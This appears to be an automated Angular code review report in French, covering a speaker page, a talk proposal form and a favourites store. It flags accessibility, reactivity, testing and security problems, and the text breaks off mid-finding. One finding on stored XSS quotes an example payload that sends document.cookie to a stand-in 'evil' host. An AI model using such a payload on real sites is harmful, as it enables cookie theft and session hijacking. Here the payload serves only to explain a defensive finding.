# Review Angular — revue → depart

**Verdict : 🔴 REQUEST_CHANGES — corrections nécessaires avant merge**
Angular 22.2.0 · 15 fichier(s) revu(s) · 2026-10-09

> La branche ajoute une page speaker (/speakers/:id), un formulaire de proposition de talk protégé par un guard de date, un « Tout ajouter aux favoris » et un retour de statut sur les cartes de talk. La page speaker ne fonctionne pas : takeUntilDestroyed() dans ngOnInit lève NG0203, elle appelle une API localhost:3000 qui n'existe pas, et elle expose une XSS stockée via bypassSecurityTrustHtml sur la bio. Plusieurs bugs de réactivité zoneless (signal muté en place, signal non appelé, champs simples modifiés en asynchrone) cassent des retours visibles par l'utilisateur, et la partie speakers ignore les conventions du dépôt (control flow natif, input()/output(), signals).

| 🔴 BLOCKER | 🟠 MAJOR | 🟡 MINOR | 🔵 INFO |
|:---:|:---:|:---:|:---:|
| 2 | 11 | 24 | 4 |

## Findings

### 🟠 F-001 · R-A11Y-013 — Champ de formulaire sans label
`src/app/proposals/proposal-form.html:15` · a11y · confiance low · scan+review · sévérité BLOCKER → MAJOR

```html
<input class="proposal__title" formControlName="title" placeholder="Titre du talk" />
```
**Problème** — Le champ « Titre du talk », le seul obligatoire du formulaire, n'a pas de nom accessible : le placeholder n'est pas un libellé. Un lecteur d'écran annonce « zone d'édition, vide », et le placeholder disparaît dès la saisie (WCAG 1.3.1, 3.3.2, 4.1.2). Les autres champs (track, résumé, bio) ont bien un <label for>, celui-ci non. Le champ n'expose pas non plus son caractère obligatoire (pas de `required` ni d'`aria-required`).

**Correctif** — Le mettre dans un `.field` comme les autres : `<label for="title">Titre du talk</label><input id="title" class="proposal__title" formControlName="title" required />`. Profiter du changement pour relier les aides aux champs avec `aria-describedby` (le compteur de caractères ligne 29, l'aide sur la bio ligne 35), sinon un lecteur d'écran ne les lit pas.

> Note de vérification : Barrière d'accessibilité réelle (champ obligatoire sans nom accessible), mais rien ne casse à l'exécution : MAJOR. Corriger avec un <label for="title"> visible et un id sur l'input.

Source : https://angular.dev/best-practices/a11y

### 🟠 F-002 · R-A11Y-005 — (click) sur un élément non interactif
`src/app/speakers/speaker-spotlight.html:22` · a11y · confiance medium · scan+review · sévérité BLOCKER → MAJOR

```html
<div class="talk" *ngFor="let talk of talks" (click)="select.emit(talk.id)">
```
**Problème** — Chaque talk est un <div> cliquable : pas de focus au clavier, pas d'activation par Entrée ou Espace, pas de rôle annoncé. L'affordance n'existe qu'à la souris (`cursor: pointer` et `.talk:hover` dans speaker-spotlight.css, lignes 67-72). Pire, le composant est routé (`speakers/:id`) : personne n'écoute l'output `select`, donc le clic ne fait rien, même à la souris.

**Correctif** — Il s'agit d'une navigation vers le détail du talk : utiliser un vrai lien, `<a class="talk" [routerLink]="['/talks', talk.id]">…</a>` (dans un `@for (talk of talks; track talk.id)`), et ajouter un style `:focus-visible` équivalent au `:hover`.

> Note de vérification : En plus de la barrière clavier, le clic n'a aucun effet : le composant est routé, donc personne n'écoute l'output `select` (voir F-020). Le plus simple : un <a [routerLink]="['/talks', talk.id]"> par talk, focusable et fonctionnel.

Source : https://angular.dev/best-practices/a11y

### 🔴 F-003 · R-SIG-005 — API à contexte d'injection appelée hors contexte (NG0203)
`src/app/speakers/speaker-spotlight.ts:30` · reactivity · confiance medium · scan+review

```ts
this.route.paramMap.pipe(takeUntilDestroyed()).subscribe((params) => {
```
**Problème** — `takeUntilDestroyed()` sans argument est appelé dans `ngOnInit()`, qui n'est pas un contexte d'injection : `assertInInjectionContext` lève NG0203 dès l'initialisation du composant. L'abonnement à `paramMap` n'est jamais créé, donc la page /speakers/:id reste bloquée sur « Chargement du speaker… » et une erreur part dans la console. Le spec ne le détecte pas : il n'appelle jamais `fixture.detectChanges()`, donc `ngOnInit` ne s'exécute pas.

**Correctif** — Passer un `DestroyRef` explicite (`private readonly destroyRef = inject(DestroyRef);` puis `takeUntilDestroyed(this.destroyRef)`), ou mieux, construire le flux dans un initialiseur de champ avec `toSignal(...)` (voir R-RX-001). Ajouter `fixture.detectChanges()` dans le spec pour couvrir `ngOnInit`.

> Note de vérification : Vérifié : `takeUntilDestroyed()` sans DestroyRef appelle inject(), et ngOnInit n'est pas un contexte d'injection. NG0203 à chaque ouverture de /speakers/:id. La page speaker ne fonctionne jamais. Le spec ne le voit pas parce qu'il ne déclenche pas ngOnInit (F-049).

Source : https://angular.dev/errors/NG0203

### 🟠 F-004 · R-ERR-005
`src/app/speakers/speaker-spotlight.ts:32` · a11y-error-handling · confiance high · review · sévérité BLOCKER → MAJOR

```ts
this.speakerService.getSpeaker(id).subscribe((speaker) => {
```
**Problème** — Les appels HTTP `getSpeaker` (ligne 32) et `getTalks` (ligne 35) n'ont ni callback `error` ni `catchError`, ni ici ni dans SpeakerService. Sur un 404 (id inconnu), une API absente (localhost:3000) ou une coupure réseau, `speaker` reste undefined et le template affiche « Chargement du speaker… » indéfiniment. L'utilisateur, lecteur d'écran compris, n'a aucun message d'erreur ni moyen de réessayer, et l'erreur part seule vers l'ErrorHandler global. Les subscribe imbriqués ne sont pas non plus annulés quand l'id change.

**Correctif** — Aplatir et gérer l'erreur au callsite : `this.route.paramMap.pipe(map(p => p.get('id') ?? this.speakerId), switchMap(id => this.speakerService.getSpeaker(id)), catchError(() => { this.error.set('Ce speaker est introuvable ou le service est indisponible.'); return EMPTY; }), takeUntilDestroyed(this.destroyRef)).subscribe(...)`. Dans le template, prévoir un état d'erreur : `@if (error()) { <div class="status status--error" role="alert"><p>{{ error() }}</p></div> }`. Faire de même pour getTalks, ou passer par `httpResource`, dont l'état `error()` est natif.

> Note de vérification : Chargement infini sur toute erreur HTTP, sans message. MAJOR et non BLOCKER : c'est la gestion d'erreur qui manque. La cause qui bloque vraiment la page est F-026 (API absente).

Source : https://angular.dev/best-practices/error-handling

### 🔴 F-005 · R-SEC-003 — bypassSecurityTrust* (sanitizer contourné)
`src/app/speakers/speaker-spotlight.ts:34` · security · confiance medium · scan+review

```ts
this.bioHtml = this.sanitizer.bypassSecurityTrustHtml(speaker.bio);
```
**Problème** — XSS stockée : `speaker.bio` vient de l'API (`SpeakerService.getSpeaker`) et c'est un texte saisi par le speaker lui-même. Le formulaire de proposition l'invite d'ailleurs à y mettre du HTML (« HTML autorisé (gras, liens…) : la bio s'affiche sur votre page speaker », proposal-form.html:35). `bypassSecurityTrustHtml` coupe le sanitizer d'Angular, puis la valeur est injectée telle quelle par `[innerHTML]="bioHtml"` (speaker-spotlight.html:13). Une bio contenant `<img src=x onerror="fetch('//evil?c='+document.cookie)">` exécute donc du JavaScript chez chaque visiteur de `/speakers/:id`. Aucun commentaire ne justifie ce bypass.

**Correctif** — Supprimer le bypass et laisser Angular assainir : il garde `<b>`, `<i>`, `<a href>`, etc. et retire les scripts et les handlers `on*`. Typer la valeur en `string` : `protected readonly bioHtml = computed(() => this.speaker()?.bio ?? '');` puis garder `<div class="spotlight__bio" [innerHTML]="bioHtml()"></div>`. S'il faut un HTML riche au-delà de ce que garde le sanitizer, l'assainir côté serveur à l'enregistrement (liste blanche de balises), puis seulement ensuite marquer la valeur sûre, avec un commentaire `// SAFE: ...` qui explique pourquoi.

> Note de vérification : XSS stockée confirmée : la bio est une saisie libre (le formulaire annonce « HTML autorisé ») et elle est injectée via bypassSecurityTrustHtml + [innerHTML]. Supprimer le bypass : [innerHTML]="speaker.bio" passe par le sanitizer Angular, qui garde gras et liens.

Source : https://angular.dev/best-practices/security

### 🟠 F-007 · R-SIG-010 — Signal testé sans être appelé
`src/app/talks/talk-card.ts:28` · reactivity · confiance high · scan+review · sévérité BLOCKER → MAJOR

```ts
if (!this.isFavorite) {
```
**Problème** — `isFavorite` est un input signal, donc une fonction : `!this.isFavorite` vaut toujours `false`. La branche « Ajouté à vos favoris » ne s'exécute jamais, et chaque clic annonce « Retiré de vos favoris » (dans une zone `role="status"`, donc lu par les lecteurs d'écran), même quand on ajoute le talk aux favoris.

**Correctif** — Appeler le signal : `if (!this.isFavorite()) { ... }`. Activer `@angular-eslint/no-uncalled-signals` pour attraper ce cas.

> Note de vérification : Bug confirmé : `!this.isFavorite` teste la fonction du signal, toujours vraie, donc la région role="status" annonce toujours « Retiré de vos favoris ». Rien ne plante à l'exécution, mais le message est faux : MAJOR. Corriger avec `this.isFavorite()`. Regroupe F-027 (live region) et F-028 (aucun test du message).

Source : https://angular.dev/guide/signals

### 🟡 F-008 · R-PERF-001
`src/app/app.routes.ts:22` · performance · confiance high · review · sévérité MAJOR → MINOR

```ts
  { path: 'speakers/:id', component: SpeakerSpotlight, title: 'Speaker · Conf Planner' },
```
**Problème** — La route `speakers/:id` est la seule route secondaire chargée en eager : l'import statique de `SpeakerSpotlight` (ligne 3) place le composant, son template, `DatePipe`, `NgIf`/`NgFor` et `SpeakerService` (avec `HttpClient`) dans le bundle initial. Tous les visiteurs du programme paient ce code, même s'ils n'ouvrent jamais une page speaker. Toutes les autres routes du fichier utilisent `loadComponent`.

**Correctif** — Passer en lazy comme les autres routes et supprimer l'import statique : `{ path: 'speakers/:id', loadComponent: () => import('./speakers/speaker-spotlight'), title: 'Speaker · Conf Planner' }`, avec `export default class SpeakerSpotlight` dans `speaker-spotlight.ts` (forme courte, R-PERF-002).

> Note de vérification : Écart avec les autres routes (toutes en loadComponent) qui gonfle le bundle initial. Le surcoût est modeste : MINOR. Passer en `loadComponent: () => import('./speakers/speaker-spotlight')` avec un export par défaut. Regroupe F-063.

Source : https://angular.dev/best-practices/performance/lazy-loaded-routes

### 🟠 F-009 · R-SIG-004 — Mutation en place de la valeur d'un signal
`src/app/favorites/favorites.store.ts:28` · reactivity · confiance medium · scan+review

```ts
this.ids().push(id);
```
**Problème** — `add()` mute le tableau du signal `ids` sans changer sa référence, donc rien n'est notifié : le compteur `count()` du header (app.html, `favoritesCount()`), les `has()` lus dans les templates et l'`effect` qui persiste dans `localStorage` ne voient pas l'ajout. Après « Tout ajouter à mes favoris » (speaker-spotlight), le compteur ne bouge pas et rien n'est sauvegardé. Les ids ajoutés n'apparaissent qu'au prochain `toggle()`, qui recopie le tableau muté, d'où un état incohérent. `add()` ne vérifie pas non plus les doublons.

**Correctif** — `add(id: string): void { this.ids.update((ids) => (ids.includes(id) ? ids : [...ids, id])); }`. Pour l'ajout groupé, prévoir `addAll(ids: string[])` qui fait une seule `update` avec une nouvelle référence.

> Note de vérification : Confirmé : `this.ids().push(id)` ne notifie pas le signal. Le compteur du header, les étoiles et la persistance localStorage ne voient pas « Tout ajouter ». En plus, aucun dédoublonnage : un talk déjà en favori est ajouté deux fois. Corriger : `this.ids.update(ids => ids.includes(id) ? ids : [...ids, id])`, avec un test dans favorites.store.spec.ts. Regroupe F-010, F-011 et F-012.

Source : https://angular.dev/guide/signals

### 🟡 F-013 · R-TEST-001
`src/app/proposals/proposal-form.ts:15` · testing · confiance high · review · sévérité MAJOR → MINOR

```ts
export default class ProposalForm implements OnInit {
```
**Problème** — Nouveau composant de formulaire sans `proposal-form.spec.ts`, alors qu'il porte des règles métier : titre obligatoire (soumission bloquée et champs marqués touchés), brouillon du résumé restauré et persisté dans localStorage, compteur de caractères, filtrage des talks du même track, enregistrement de la proposition puis passage à `submitted` après 300 ms. Aucune de ces règles n'est protégée.

**Correctif** — Créer `src/app/proposals/proposal-form.spec.ts` (Vitest, zoneless) : `beforeEach(() => localStorage.clear()); it('bloque la soumission sans titre', async () => { const fixture = TestBed.createComponent(ProposalForm); await fixture.whenStable(); fixture.componentInstance.submit(); expect(fixture.componentInstance.form.touched).toBe(true); expect(localStorage.getItem('conf-planner:last-proposal')).toBeNull(); }); it('enregistre la proposition valide', async () => { vi.useFakeTimers(); /* remplir title, appeler submit() */ await vi.advanceTimersByTimeAsync(300); expect(JSON.parse(localStorage.getItem('conf-planner:last-proposal')!)).toMatchObject({ title: 'Signals' }); });` plus un test du brouillon restauré au démarrage et de `sameTrackTalks()` après changement de track.

> Note de vérification : Absence de spec : maintenabilité, pas un bug en soi. Regroupe F-029.

Source : https://angular.dev/guide/testing

### 🟠 F-014 · R-ERR-008
`src/app/proposals/proposal-form.ts:61` · a11y-error-handling · confiance high · review

```ts
this.form.markAllAsTouched();
```
**Problème** — Si on envoie le formulaire sans titre, `submit()` marque les champs comme touchés puis s'arrête. Mais le template n'affiche aucun message d'erreur, ne pose pas `aria-invalid` et ne déplace pas le focus. Le clic sur « Envoyer ma proposition » ne produit donc rien de visible ni d'annoncé : l'utilisateur ne sait pas pourquoi l'envoi échoue (WCAG 3.3.1).

**Correctif** — Afficher une erreur reliée au champ, et focaliser le premier champ invalide dans submit() : `@if (form.get('title')?.invalid && form.get('title')?.touched) { <p id="title-error" class="field__error">Le titre est obligatoire.</p> }`, avec `[attr.aria-invalid]="form.get('title')?.invalid && form.get('title')?.touched"` et `[attr.aria-describedby]="... ? 'title-error' : null"` sur l'input.

Source : https://angular.dev/best-practices/error-handling

### 🟠 F-015 · R-PERF-035 — Zoneless : état modifié hors signal dans un callback asynchrone
`src/app/proposals/proposal-form.ts:67` · performance · confiance low · scan+review

```ts
this.submitted = true;
```
**Problème** — En zoneless, le champ simple `submitted` est passé à `true` dans un `setTimeout` de 300 ms, après la fin du tick déclenché par `ngSubmit`. Aucun rendu n'est planifié : le message « Merci ! Votre proposition a bien été enregistrée. » (`@if (submitted)` dans proposal-form.html) ne s'affiche pas tant qu'un autre événement ne survient pas. L'utilisateur croit que l'envoi a échoué et risque de soumettre une deuxième fois.

**Correctif** — `protected readonly submitted = signal(false);` puis `setTimeout(() => this.submitted.set(true), 300);` et `@if (submitted())` dans le template.

> Note de vérification : Confirmé en zoneless : champ simple modifié dans setTimeout, aucun rendu planifié, le message de confirmation n'apparaît pas. Passer `submitted` en signal (et supprimer le setTimeout s'il ne sert à rien).

Source : https://angular.dev/guide/zoneless

### 🟡 F-016 · R-TEST-001
`src/app/proposals/proposal.guard.ts:11` · testing · confiance high · review · sévérité MAJOR → MINOR

```ts
if (Date.now() > CFP_CLOSES_AT.getTime()) {
```
**Problème** — Nouveau guard sans spec, alors qu'il encode une règle métier datée (fermeture du CFP au 30/11/2026, redirection vers `/` ensuite). La bascule n'est vérifiée par aucun test : une erreur de date ou de comparaison ne se verra qu'en production, le jour de la clôture.

**Correctif** — Créer `proposal.guard.spec.ts` avec les fake timers de Vitest : `afterEach(() => vi.useRealTimers()); it('laisse passer avant la clôture', () => { vi.useFakeTimers(); vi.setSystemTime(new Date('2026-11-30T12:00:00')); TestBed.configureTestingModule({ providers: [provideRouter([])] }); expect(TestBed.inject(ProposalGuard).canActivate()).toBe(true); }); it('redirige vers le programme après la clôture', () => { vi.useFakeTimers(); vi.setSystemTime(new Date('2026-12-01T00:00:00')); TestBed.configureTestingModule({ providers: [provideRouter([])] }); const result = TestBed.inject(ProposalGuard).canActivate(); expect(TestBed.inject(Router).serializeUrl(result as UrlTree)).toBe('/'); });`

> Note de vérification : Absence de spec sur une règle datée : à ajouter avec vi.setSystemTime. Maintenabilité : MINOR. Regroupe F-039.

Source : https://angular.dev/guide/testing

### 🟠 F-017 · R-A11Y-014 — Image sans attribut alt
`src/app/speakers/speaker-spotlight.html:5` · a11y · confiance high · scan+review

```html
<img *ngIf="speaker.photoUrl" class="spotlight__photo" [src]="speaker.photoUrl" />
```
**Problème** — La photo du speaker n'a pas d'attribut `alt` : un lecteur d'écran annonce l'URL ou le nom du fichier à la place (WCAG 1.1.1).

**Correctif** — Le nom du speaker est dans le <h1> juste à côté : la photo est redondante, donc `alt=""`. Sinon, `[alt]="'Photo de ' + speaker.name"`. Par exemple, avec NgOptimizedImage (règle projet) : `<img [ngSrc]="speaker.photoUrl" width="80" height="80" alt="" class="spotlight__photo" />`.

> Note de vérification : À noter aussi : `photoUrl` n'existe pas dans l'interface Speaker (voir F-053), donc l'image ne s'affiche peut-être jamais. L'alt reste obligatoire dès qu'elle s'affiche.

Source : https://angular.dev/best-practices/a11y

### 🟠 F-018 · R-TEST-002 — Test focalisé (fit/fdescribe/.only)
`src/app/speakers/speaker-spotlight.spec.ts:20` · testing · confiance high · scan+review

```ts
it.only('should create', () => {
```
**Problème** — `it.only` focalise Vitest sur ce seul test : dans tout fichier chargé avec lui, les autres tests sont ignorés, et la CI peut passer au vert alors que des specs existantes (TalkCard, FavoritesStore, TalkList...) ne tournent plus ou plus entièrement. Le test focalisé ne vérifie en plus que la création du composant.

**Correctif** — Retirer la focalisation avant le merge : `it('...', () => { ... })`. Pour s'en prémunir en CI, lancer Vitest avec `--allowOnly=false` (échec si un `.only` subsiste).

> Note de vérification : Précision : Vitest limite `.only` au fichier qui le contient. Les autres specs ne sont donc pas désactivées localement. En CI (variable CI définie), allowOnly vaut false par défaut et la suite échoue. Non vérifié ici : les tests n'ont pas pu être lancés dans cet environnement. Dans tous les cas, retirer `.only`.

Source : https://angular.dev/guide/testing

### 🟡 F-019 · R-PERF-020 — Composant forcé en Eager/Default (Angular ≥ 22)
`src/app/speakers/speaker-spotlight.ts:14` · performance · confiance high · scan+review · sévérité MAJOR → MINOR

```ts
changeDetection: ChangeDetectionStrategy.Eager,
```
**Problème** — Code neuf qui force `Eager` sans commentaire. Depuis Angular 22, OnPush est le défaut : ce composant sera donc vérifié à chaque tick de l'application, ce qui ré-exécute aussi `getInitials()` dans le template. `Eager` sert visiblement à compenser des champs non signal (`speaker`, `talks`, `bioHtml`) modifiés dans des `subscribe`. Mais en zoneless, `Eager` ne planifie aucun rendu à la réponse HTTP : il masque le problème seulement quand un autre événement déclenche un tick (voir R-PERF-035).

**Correctif** — Retirer `changeDetection` (et l'import `ChangeDetectionStrategy`) et exposer l'état en signals, par exemple `speaker = toSignal(route.paramMap.pipe(switchMap(p => service.getSpeaker(p.get('id')!))))`, ou `httpResource()`.

> Note de vérification : Eager masque le problème de rafraîchissement sans le résoudre : en zoneless, une réponse HTTP ne déclenche toujours aucun cycle. Le coût en performance est faible : MINOR. Retirer Eager une fois l'état passé en signals.

Source : https://angular.dev/best-practices/skipping-subtrees

### 🟡 F-020 · R-ARCH-027 — Output nommé comme un événement DOM natif
`src/app/speakers/speaker-spotlight.ts:18` · architecture · confiance high · scan+review · sévérité MAJOR → MINOR

```ts
@Output() select = new EventEmitter<string>();
```
**Problème** — Output nommé `select`, comme l'événement DOM natif `select` (qui bulle depuis les input/textarea) : un `(select)` côté parent se déclencherait aussi sur une sélection de texte. En plus, l'output n'est pas `readonly` (R-ARCH-009) et il ne sert à rien : le composant est routé (`component: SpeakerSpotlight`), donc aucun parent ne l'écoute et le clic sur un talk (html ligne 22) n'a aucun effet visible.

**Correctif** — Supprimer l'output et rendre chaque talk navigable avec un vrai lien : `<a [routerLink]="['/talks', talk.id]">{{ talk.title }}</a>`. Si un output est vraiment nécessaire : `readonly talkSelected = output<string>();`.

> Note de vérification : Output mort (composant routé, aucun parent ne l'écoute) et nommé comme un événement DOM. À supprimer au profit d'un lien vers le talk (F-002).

Source : https://angular.dev/guide/components/outputs

### 🟡 F-022 · R-RX-001 — subscribe imbriqués
`src/app/speakers/speaker-spotlight.ts:32` · reactivity · confiance high · scan+review · sévérité MAJOR → MINOR

```ts
this.speakerService.getSpeaker(id).subscribe((speaker) => {
```
**Problème** — Trois `subscribe` imbriqués (lignes 30, 32 et 35). Quand le paramètre `id` change (navigation d'un speaker à un autre sans détruire le composant), les requêtes `getSpeaker`/`getTalks` en cours ne sont pas annulées : la réponse la plus lente gagne, et on peut afficher le speaker B avec les talks de A. Les abonnements internes ne sont pas non plus liés à la destruction du composant, et aucune erreur HTTP n'est gérée. En plus, ils écrivent dans des champs simples (`speaker`, `talks`) : en zoneless, une réponse HTTP ne déclenche pas de détection de changements, donc la vue ne se met à jour qu'au prochain événement.

**Correctif** — Composer en un seul flux et l'exposer en signal : `private readonly speaker$ = this.route.paramMap.pipe(map((p) => p.get('id') ?? this.speakerId), switchMap((id) => this.speakerService.getSpeaker(id)));` puis `readonly speaker = toSignal(this.speaker$);` et `readonly talks = toSignal(this.speaker$.pipe(switchMap((s) => this.speakerService.getTalks(s.id))), { initialValue: [] });` (ou `shareReplay({ bufferSize: 1, refCount: true })` pour ne pas dupliquer la requête). Autre option en Angular 22 : `rxResource`/`httpResource` avec l'id en paramètre (R-SIG-007), qui gère chargement, erreur et annulation.

> Note de vérification : La course n'arrive qu'en naviguant d'un speaker à l'autre sans quitter la route (précédent/suivant), car la page n'a aucun lien entre speakers : MINOR. La réécriture qui corrige F-003 et F-023 règle aussi ce point : `toSignal(route.paramMap.pipe(map(p => p.get('id')!), switchMap(id => ...)))`. Regroupe les lignes 30, 32 et 35 (F-021, F-024).

Source : https://angular.dev/ecosystem/rxjs-interop

### 🟠 F-023 · R-PERF-035 — Zoneless : état modifié hors signal dans un callback asynchrone
`src/app/speakers/speaker-spotlight.ts:33` · performance · confiance low · scan+review

```ts
this.speaker = speaker;
```
**Problème** — Application zoneless : `this.speaker` (ligne 33), `this.bioHtml` (ligne 34) et `this.talks` (ligne 36) sont des champs simples affectés dans des callbacks `subscribe` de requêtes HTTP. Rien ne notifie le scheduler à l'arrivée de la réponse. La page reste donc sur « Chargement du speaker… » (puis sans liste de talks) jusqu'au prochain événement utilisateur qui déclenche un tick. `Eager` ne corrige pas ce cas.

**Correctif** — Stocker l'état dans des signals : `protected readonly speaker = signal<Speaker | null>(null);` puis `this.speaker.set(speaker)`, ou mieux, dériver sans `subscribe` : `toSignal(paramMap.pipe(switchMap(...)))` ou `httpResource(() => `${baseUrl}/${id()}`)`. Le template lit alors `speaker()` et `talks()`.

> Note de vérification : Masqué aujourd'hui par F-003 (le subscribe n'est jamais créé), mais apparaîtra dès F-003 corrigé : champs simples affectés dans subscribe, donc pas de rendu en zoneless. Regroupe les lignes 34 et 36 (F-025).

Source : https://angular.dev/guide/zoneless

### 🟠 F-026 · R-ARCH-030 — URL d'API codée en dur
`src/app/speakers/speaker.service.ts:7` · architecture · confiance high · scan+review · sévérité MINOR → MAJOR (angular-architecture-reviewer)

```ts
private baseUrl = 'http://localhost:3000/api/speakers';
```
**Problème** — URL absolue codée en dur vers un backend qui n'existe pas dans le dépôt (aucun serveur ni proxy sur le port 3000 ; les données sont servies depuis `public/data` via le token `API_BASE_URL`). La page speaker reste donc bloquée sur « Chargement du speaker… » dans tous les environnements. Surtout, ce service duplique une source de données qui existe déjà : `TalksStore` charge `speakers.json` et `talks.json` (`speakersById`, `schedule` avec `speakerId`).

**Correctif** — Supprimer `SpeakerService` et dériver la page de `TalksStore` : `private readonly store = inject(TalksStore); readonly id = input.required<string>(); protected readonly speaker = computed(() => this.store.speakersById().get(this.id())); protected readonly talks = computed(() => this.store.schedule().filter((t) => t.speakerId === this.id()));`. Si une API dédiée est vraiment nécessaire, utiliser `inject(API_BASE_URL)` et `httpResource`.

> Note de vérification : Le dépôt n'a aucun serveur sur le port 3000. Les speakers sont déjà chargés par TalksStore depuis public/data/speakers.json. La page speaker ne peut donc fonctionner dans aucun environnement. Réutiliser TalksStore (speakers + talks filtrés par speakerId) plutôt qu'un nouveau service HTTP.

Source : https://angular.dev/guide/di/defining-dependency-providers

### 🟡 F-032 · R-ERR-010
`src/app/proposals/proposal-form.ts:20` · a11y-error-handling · confiance medium · review

```ts
abstract = signal(localStorage.getItem(ABSTRACT_DRAFT_KEY) ?? '');
```
**Problème** — Le code accède à localStorage sans protection à trois endroits : à l'initialisation du composant (ligne 20), dans un effect (ligne 42) et dans submit() (ligne 65). Si le stockage est bloqué (SecurityError) ou plein (QuotaExceededError), ligne 20 la page « Proposer un talk » ne se crée pas et reste blanche. Ligne 65, submit() lève une exception avant le setTimeout : aucune confirmation, aucun message, et la proposition est perdue sans que l'utilisateur le sache. FavoritesStore protège déjà sa lecture avec try/catch.

**Correctif** — Isoler les accès dans des helpers protégés, par exemple `function readDraft(): string { try { return localStorage.getItem(ABSTRACT_DRAFT_KEY) ?? ''; } catch { return ''; } }`. Dans submit(), entourer `setItem` d'un try/catch qui remplit un signal d'erreur affiché dans un `role="alert"` (« Impossible d'enregistrer votre proposition. Réessayez. »).

Source : https://angular.dev/best-practices/error-handling

### 🔵 F-033 · R-ARCH-008
`src/app/proposals/proposal-form.ts:21` · architecture · confiance high · review · sévérité MINOR → INFO

```ts
selectedTrack = signal<Track>('Frontend');
```
**Problème** — Membres du template laissés publics et mutables : `abstract`, `selectedTrack`, `sameTrackTalks`, `tracks`, `form`, `charCount`, `submitted`, `onAbstractInput`, `submit` (lignes 20 à 59). Les dépendances injectées (lignes 16 à 18) ne sont pas `readonly`.

**Correctif** — `protected readonly selectedTrack = signal<Track>('Frontend');`, `protected readonly tracks = TRACKS;`, `protected submit(): void`, `private readonly talksStore = inject(TalksStore);`.

Source : https://angular.dev/style-guide

### 🟡 F-034 · R-ARCH-031 — Formulaires non typés
`src/app/proposals/proposal-form.ts:27` · architecture · confiance high · scan+review

```ts
form: UntypedFormGroup = this.fb.group({
```
**Problème** — Formulaire neuf construit avec `UntypedFormBuilder` / `UntypedFormGroup` (lignes 3, 16, 27) : toutes les valeurs sont `any`, d'où le `(track: Track)` forcé ligne 52 et le `Record<string, unknown>` de `draft`.

**Correctif** — `private readonly fb = inject(NonNullableFormBuilder); protected readonly form = this.fb.group({ title: ['', Validators.required], track: this.fb.control<Track>('Frontend', Validators.required), bio: [''] });` — ou, pour un nouveau formulaire en v22, les Signal Forms (`form()` + `[formField]`).

Source : https://angular.dev/guide/forms/typed-forms

### 🟡 F-035 · R-SIG-003 — effect() qui écrit dans un signal (état dérivé)
`src/app/proposals/proposal-form.ts:38` · reactivity · confiance medium · scan+review · sévérité MAJOR → MINOR (angular-reactivity-reviewer)

```ts
this.charCount.set(this.abstract().length);
```
**Problème** — Cet `effect` ne sert qu'à recopier une valeur dérivée (`abstract().length`) dans un autre signal. Il ne provoque pas de boucle (`charCount` n'est pas lu dans l'effet), mais il crée un état en double, initialisé à 0 jusqu'au premier passage de l'effet, et un graphe de dépendances moins lisible. Le second `effect` (localStorage, ligne 42) est, lui, un effet de bord légitime.

**Correctif** — Remplacer le signal et l'effet par une dérivation : `readonly charCount = computed(() => this.abstract().length);` et supprimer le premier `effect`.

> Note de vérification : Pas de boucle, mais un état en double : `charCount = computed(() => this.abstract().length)`.

Source : https://angular.dev/guide/signals/linked-signal

### 🟡 F-036 · R-ARCH-017 — subscribe sans désabonnement dans un composant/directive
`src/app/proposals/proposal-form.ts:47` · architecture · confiance medium · scan+review · sévérité BLOCKER → MINOR (angular-architecture-reviewer)

```ts
this.form.valueChanges.subscribe(v => this.draft = v);
```
**Problème** — Subscribe à `valueChanges` sans `takeUntilDestroyed`, alors que la ligne 51 l'applique : incohérent. Le formulaire appartient au composant, donc l'abonnement est collecté avec lui (pas de fuite réelle, d'où MINOR et non BLOCKER). En revanche, le miroir `draft` est redondant : il ne sert qu'à `submit()`, qui peut lire le formulaire directement.

**Correctif** — Supprimer le subscribe et le champ `draft`, puis dans `submit()` : `const proposal = { ...this.form.getRawValue(), abstract: this.abstract() };`.

> Note de vérification : Pas de fuite (le formulaire meurt avec le composant). Le miroir `draft` est inutile : utiliser `this.form.getRawValue()` dans submit().

Source : https://angular.dev/ecosystem/rxjs-interop/take-until-destroyed

### 🔵 F-037 · R-ARCH-013
`src/app/proposals/proposal-form.ts:55` · architecture · confiance high · review · sévérité MINOR → INFO

```ts
onAbstractInput(event: Event): void {
```
**Problème** — Handler nommé d'après l'événement (`onAbstractInput`) et non d'après l'action, ce qui va contre le style guide.

**Correctif** — `protected updateAbstract(value: string): void { this.abstract.set(value); }` avec `(input)="updateAbstract($any($event.target).value)"`, ou mieux, intégrer le champ au formulaire (voir R-ARCH-026).

Source : https://angular.dev/style-guide

### 🟡 F-038 · R-ARCH-016
`src/app/proposals/proposal-form.ts:65` · architecture · confiance medium · review

```ts
localStorage.setItem('conf-planner:last-proposal', JSON.stringify(proposal));
```
**Problème** — La persistance (brouillon du résumé lignes 20 et 42, proposition envoyée ligne 65) est codée directement dans le composant, avec une clé en dur différente de la constante `ABSTRACT_DRAFT_KEY`. Le dépôt a déjà un modèle pour ça (`FavoritesStore` : signal + effet de synchronisation + lecture protégée par try/catch). Ici, impossible de tester l'envoi sans composant, et pas de point unique pour brancher une vraie API plus tard.

**Correctif** — Extraire un `ProposalStore` dans `src/app/proposals/proposal.store.ts` (`draftAbstract` signal persisté, `submit(proposal)`) et ne garder dans le composant que l'orchestration.

Source : https://angular.dev/style-guide

### 🟡 F-040 · R-ARCH-032 — Guard/resolver sous forme de classe
`src/app/proposals/proposal.guard.ts:7` · architecture · confiance high · scan+review

```ts
export class ProposalGuard implements CanActivate {
```
**Problème** — Guard neuf écrit en classe `CanActivate` : ce n'est pas déprécié, mais c'est plus verbeux que l'idiome actuel `CanActivateFn` et ça oblige à enregistrer un service racine juste pour une fonction.

**Correctif** — `export const proposalGuard: CanActivateFn = () => Date.now() > CFP_CLOSES_AT.getTime() ? inject(Router).parseUrl('/') : true;` et `canActivate: [proposalGuard]` dans app.routes.ts.

Source : https://angular.dev/guide/routing/route-guards

### 🟡 F-041 · R-ARCH-028 — Directives structurelles *ngIf/*ngFor/*ngSwitch (dépréciées depuis v20)
`src/app/speakers/speaker-spotlight.html:3` · architecture · confiance high · scan+review

```html
<section class="spotlight" *ngIf="speaker; else loading">
```
**Problème** — Le nouveau template utilise `*ngIf` (lignes 3, 5, 6, avec `<ng-template #loading>` ligne 28) et `*ngFor` sans `trackBy` (ligne 22), dépréciés depuis Angular 20 et contraires à AGENTS.md (control flow natif, `@for` avec `track item.id`). Le reste de l'application utilise déjà `@if` / `@for`.

